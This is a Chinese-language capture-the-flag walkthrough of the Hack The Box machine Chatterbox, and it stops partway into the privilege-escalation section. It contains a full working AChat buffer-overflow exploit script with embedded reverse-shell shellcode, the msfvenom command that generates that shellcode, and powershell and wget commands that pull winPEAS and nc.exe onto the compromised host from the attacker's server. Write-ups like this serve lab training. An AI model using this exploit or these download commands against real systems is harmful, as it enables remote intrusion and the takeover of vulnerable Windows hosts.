# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
```
┌──(root💀kali)-[~/htb/Chatterbox]
└─# nmap 10.10.10.74 -sV -T4 -A -O -p 9255,9256                                                                                                        130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 08:21 EST
Nmap scan report for 10.10.10.74
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9256/tcp)
HOP RTT       ADDRESS
1   249.48 ms 10.10.14.1
2   249.69 ms 10.10.10.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds

```

只有两个端口显示运行了一个叫AChat的软件，kali搜索这个软件漏洞
```
──(root💀kali)-[~/htb/Chatterbox]
└─# searchsploit AChat chat 
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                       | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                          | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                               | php/webapps/24647.txt
------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

显示有个bof。于是在github上找到了[这个exp](https://github.com/mpgn/AChat-Reverse-TCP-Exploit)


但是这台靶机的exp不能够使用meterpreter，一进去就死掉，因此要做一些修改

生成payload：
```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  RHOST=10.10.10.74 LHOST=10.10.14.8 LPORT=4444 exitfunc=thread -e x86/unicode_upper -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

bof.py
```
#!/bin/usr/python
#Script written by UN1X00
#Tested 25/05/2018 Windows 7/8/10

import socket
import sys, time

class bcolours:
    GREEN = '\033[92m'
    TURQ = '\033[96m'
    ENDC = '\033[0m'

#YOU WILL NEED TO PASTE THE OUTPUT FROM THE SHELL SCRIPT: "ACHAT_PAYLOAD.SH" BELOW:

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51"
buf += b"\x41\x54\x41\x58\x41\x5a\x41\x50\x41\x33\x51\x41\x44"
buf += b"\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41"
buf += b"\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50"
buf += b"\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50"
buf += b"\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
buf += b"\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51"
buf += b"\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42"
buf += b"\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b"
buf += b"\x4c\x49\x58\x43\x52\x4b\x50\x4b\x50\x4d\x30\x43\x30"
buf += b"\x34\x49\x39\x55\x4e\x51\x59\x30\x53\x34\x54\x4b\x30"
buf += b"\x50\x30\x30\x34\x4b\x51\x42\x4c\x4c\x44\x4b\x30\x52"
buf += b"\x4d\x44\x34\x4b\x53\x42\x4f\x38\x4c\x4f\x57\x47\x30"
buf += b"\x4a\x4d\x56\x30\x31\x4b\x4f\x46\x4c\x4f\x4c\x53\x31"
buf += b"\x53\x4c\x4c\x42\x4e\x4c\x4d\x50\x47\x51\x48\x4f\x4c"
buf += b"\x4d\x4d\x31\x58\x47\x4a\x42\x5a\x52\x32\x32\x30\x57"
buf += b"\x54\x4b\x51\x42\x4e\x30\x44\x4b\x4f\x5a\x4f\x4c\x54"
buf += b"\x4b\x50\x4c\x4e\x31\x32\x58\x49\x53\x31\x38\x4d\x31"
buf += b"\x5a\x31\x32\x31\x54\x4b\x42\x39\x4d\x50\x4d\x31\x48"
buf += b"\x53\x34\x4b\x51\x39\x4d\x48\x39\x53\x4e\x5a\x50\x49"
buf += b"\x44\x4b\x50\x34\x34\x4b\x4b\x51\x4a\x36\x50\x31\x4b"
buf += b"\x4f\x56\x4c\x39\x31\x38\x4f\x4c\x4d\x4d\x31\x37\x57"
buf += b"\x50\x38\x39\x50\x33\x45\x4b\x46\x4c\x43\x53\x4d\x4a"
buf += b"\x58\x4f\x4b\x43\x4d\x4d\x54\x53\x45\x4a\x44\x32\x38"
buf += b"\x44\x4b\x30\x58\x4e\x44\x4d\x31\x59\x43\x53\x36\x54"
buf += b"\x4b\x4c\x4c\x50\x4b\x54\x4b\x30\x58\x4d\x4c\x4d\x31"
buf += b"\x59\x43\x54\x4b\x4d\x34\x34\x4b\x4b\x51\x38\x50\x54"
buf += b"\x49\x4f\x54\x4e\x44\x4e\x44\x51\x4b\x31\x4b\x43\x31"
buf += b"\x52\x39\x31\x4a\x32\x31\x4b\x4f\x49\x50\x51\x4f\x51"
buf += b"\x4f\x30\x5a\x34\x4b\x4d\x42\x5a\x4b\x34\x4d\x31\x4d"
buf += b"\x42\x48\x4f\x43\x4e\x52\x4d\x30\x4d\x30\x32\x48\x32"
buf += b"\x57\x54\x33\x50\x32\x31\x4f\x50\x54\x51\x58\x50\x4c"
buf += b"\x44\x37\x4f\x36\x4d\x37\x4b\x4f\x49\x45\x36\x58\x34"
buf += b"\x50\x4d\x31\x4b\x50\x4b\x50\x4d\x59\x37\x54\x30\x54"
buf += b"\x52\x30\x52\x48\x4f\x39\x55\x30\x42\x4b\x4d\x30\x4b"
buf += b"\x4f\x4a\x35\x32\x30\x52\x30\x30\x50\x30\x50\x31\x30"
buf += b"\x30\x50\x51\x30\x52\x30\x42\x48\x4a\x4a\x4c\x4f\x49"
buf += b"\x4f\x39\x50\x4b\x4f\x58\x55\x35\x47\x51\x5a\x4c\x45"
buf += b"\x42\x48\x4b\x5a\x4c\x4a\x4c\x4e\x4d\x38\x31\x58\x4b"
buf += b"\x52\x4d\x30\x4e\x31\x51\x4c\x54\x49\x49\x56\x32\x4a"
buf += b"\x4e\x30\x31\x46\x52\x37\x43\x38\x56\x39\x45\x55\x52"
buf += b"\x54\x31\x51\x4b\x4f\x5a\x35\x54\x45\x37\x50\x34\x34"
buf += b"\x4c\x4c\x4b\x4f\x50\x4e\x4d\x38\x32\x55\x4a\x4c\x51"
buf += b"\x58\x4c\x30\x56\x55\x57\x32\x31\x46\x4b\x4f\x38\x55"
buf += b"\x32\x48\x43\x33\x52\x4d\x43\x34\x4d\x30\x44\x49\x49"
buf += b"\x53\x52\x37\x50\x57\x32\x37\x50\x31\x4a\x56\x31\x5a"
buf += b"\x4e\x32\x31\x49\x31\x46\x4b\x32\x4b\x4d\x33\x36\x47"
buf += b"\x57\x4f\x54\x4d\x54\x4f\x4c\x4b\x51\x4d\x31\x44\x4d"
buf += b"\x4f\x54\x4d\x54\x4e\x30\x58\x46\x4d\x30\x51\x34\x30"
buf += b"\x54\x32\x30\x31\x46\x30\x56\x50\x56\x30\x46\x31\x46"
buf += b"\x50\x4e\x51\x46\x32\x36\x50\x53\x32\x36\x52\x48\x52"
buf += b"\x59\x48\x4c\x4f\x4f\x35\x36\x4b\x4f\x38\x55\x54\x49"
buf += b"\x59\x50\x30\x4e\x52\x36\x30\x46\x4b\x4f\x30\x30\x52"
buf += b"\x48\x4c\x48\x44\x47\x4d\x4d\x31\x50\x4b\x4f\x58\x55"
buf += b"\x47\x4b\x59\x50\x4d\x4d\x4d\x5a\x4b\x5a\x53\x38\x56"
buf += b"\x46\x55\x45\x47\x4d\x35\x4d\x4b\x4f\x49\x45\x4f\x4c"
buf += b"\x4d\x36\x43\x4c\x4c\x4a\x35\x30\x4b\x4b\x49\x50\x54"
buf += b"\x35\x4c\x45\x57\x4b\x4f\x57\x4c\x53\x52\x52\x42\x4f"
buf += b"\x31\x5a\x4b\x50\x32\x33\x4b\x4f\x38\x55\x41\x41"


def main (buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ('10.10.10.74', 9256)

    fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
    p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
    p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
    p += "\x62" + "A"*45
    p += "\x61\x40"
    p += "\x2A\x46"
    p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
    p += "\x61\x43" + "\x2A\x46"
    p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
    p += buf + "A" * (1152 - len(buf))
    p += "\x00" + "A"*10 + "\x00"

    print bcolours.GREEN + "[" + bcolours.TURQ + "+" + bcolours.GREEN + "]" + bcolours.ENDC + " BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER"

    i=0
    while i<len(p):
        if i > 172000:
            time.sleep(1.0)
        sent = sock.sendto(p[i:(i+8192)], server_address)
        i += sent
    sock.close()

if __name__=='__main__':
    main(buf)
```


拿到了foodhold
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.74:49165 ) at 2022-01-06 09:31:40 -0500


Shell Banner:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
-----
          

C:\Windows\system32>whoami
whoami
chatterbox\alfred

```

# 提权

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/winPEASx86.exe','c:\Users\Alfred\Desktop\winPEASx86.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/wget.exe','c:\Users\Alfred\Desktop\wget.exe')"


wget http://10.10.14.8:8000/nc.exe

